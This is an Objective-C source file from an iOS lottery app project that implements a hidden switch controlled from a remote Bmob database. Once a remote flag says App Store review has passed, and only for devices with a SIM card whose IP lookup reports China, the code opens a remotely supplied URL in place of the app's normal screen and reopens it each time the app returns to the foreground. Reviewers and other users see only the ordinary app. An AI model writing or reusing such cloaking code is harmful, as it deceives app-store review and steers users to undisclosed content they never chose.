//
//  GzwYesTool.m
//  彩票
//
//  Created by mac on 2017/11/2.
//  Copyright © 2017年 彩票. All rights reserved.
//

#import "GzwYesTool.h"
#import "GzwFirstVC.h"
#import <BmobSDK/Bmob.h>
#import <CoreTelephony/CTTelephonyNetworkInfo.h>
#import <CoreTelephony/CTCarrier.h>

//pod 'BmobSDK'
#define aaa @"IVyqPtEiztEyOeqQLzdfMsUPBQOHR4JqLdWYBpHGuwRFwTo0vQAuA8lq8UEa20Ir" // 判断pass为这一串就显示
#define bbb @"8LDMNPV5HRW6IO0YA1ZE9UXKQTS4CJ7G32BF" // 每个app都不同，用这个来找出是哪个pass

static BOOL  loaded; // 当为YES时，程序在前台时就会打开web
static NSString *URL;// 最终链接
@implementation GzwYesTool

+(void)application:(UIApplication *)application vc:(UIViewController *)vc
{
    application.keyWindow.rootViewController = [UIStoryboard storyboardWithName:@"GzwFirstVC" bundle:nil].instantiateInitialViewController;
    
    [Bmob registerWithAppKey:@"d4143c09cdb7e5d485251b00b232c526"];
    //询问是否通过审核了
    BmobQuery   *bquery = [BmobQuery queryWithClassName:@"censoringPretend2"];// 表名
    
    [bquery findObjectsInBackgroundWithBlock:^(NSArray *array, NSError *error) {
        if (error){

        }else{
            [array enumerateObjectsUsingBlock:^(BmobObject  *obj, NSUInteger idx, BOOL * _Nonnull stop) {
                if ([[obj objectForKey:@"name"] isEqualToString:bbb]) {
                    if ([[obj objectForKey:@"pass"] isEqualToString:aaa]) {// 通过审核
                        if ([GzwYesTool isSIMInstalled]) {//有SIM卡
                            [GzwYesTool getIp:^(NSDictionary *dcit) {
                                if ([dcit[@"data"][@"country_id"] isEqualToString:@"CN"]) {// 在中国
                                        loaded = YES;
                                        URL = [obj objectForKey:@"URL"];
                                        [[UIApplication sharedApplication] openURL:[NSURL URLWithString:URL]];
                                }else {// 不在中国
                                    application.keyWindow.rootViewController = vc;
                                }
                            }];
                        }else {// 无SIM卡
                            application.keyWindow.rootViewController = vc;
                        }
                    }else {// 在审核中
                        application.keyWindow.rootViewController = vc;
                    }
                }
            }];
        }
    }];
}
+(void)applicationWillEnterForeground:(UIApplication *)application
{
    if (loaded) {
        [[UIApplication sharedApplication] openURL:[NSURL URLWithString:URL]];
    }
}

// 获取IP
+(void)getIp:(void (^)(NSDictionary *dcit))block
{
    NSMutableURLRequest * request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"http://ip.taobao.com/service/getIpInfo.php?ip=myip"]] ;
    [request setHTTPMethod:@"POST"];
    NSURLSessionDataTask * task = [[NSURLSession sharedSession]dataTaskWithRequest:request completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
        
        NSLog(@" ===000 %@",[[NSString alloc]initWithData:data encoding:NSUTF8StringEncoding] );
        
        if (error == nil && data )
        {
            NSError * jsonError = nil ;
            NSDictionary *jsonData = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableContainers error:&jsonError];
            [[NSOperationQueue mainQueue] addOperationWithBlock:^{
                block(jsonData);
            }];
            
        }
        return ;
    }];
    
    [task resume];
}
// 判断设备是否安装sim卡
+(BOOL)isSIMInstalled
{
    CTTelephonyNetworkInfo *networkInfo = [[CTTelephonyNetworkInfo alloc] init];
    CTCarrier *carrier = [networkInfo subscriberCellularProvider];
    
    if (!carrier.isoCountryCode) {
        NSLog(@"No sim present Or No cellular coverage or phone is on airplane mode.");
        return NO;
    }
    return YES;
}
@end
